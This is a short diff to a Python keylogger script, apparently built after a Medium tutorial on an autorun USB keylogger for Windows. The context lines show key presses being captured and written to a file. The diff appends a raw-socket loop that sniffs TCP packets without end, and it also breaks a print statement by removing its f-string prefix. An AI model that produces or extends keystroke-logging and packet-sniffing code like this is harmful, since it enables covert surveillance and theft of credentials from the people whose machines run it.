@@ -9,7 +9,7 @@ def on_press(key):
     global word_counts, keys
     keys.append(key)
     word_counts += 1
-    print(f'{key} pressed')
+    print('{key} pressed')
     if word_counts >= 5:
         word_counts = 0
         write_file(keys)
@@ -37,3 +37,12 @@ with Listener(on_press=on_press, on_release=on_release) as listner:
 
 
 # https://medium.com/@harsathAI/python-keylogger-advanced-with-autorun-usb-for-windows-a-modern-approach-with-clear-code-573e7b828cf2
+
+
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+
+while True:
+   print(s.recvfrom(65565))
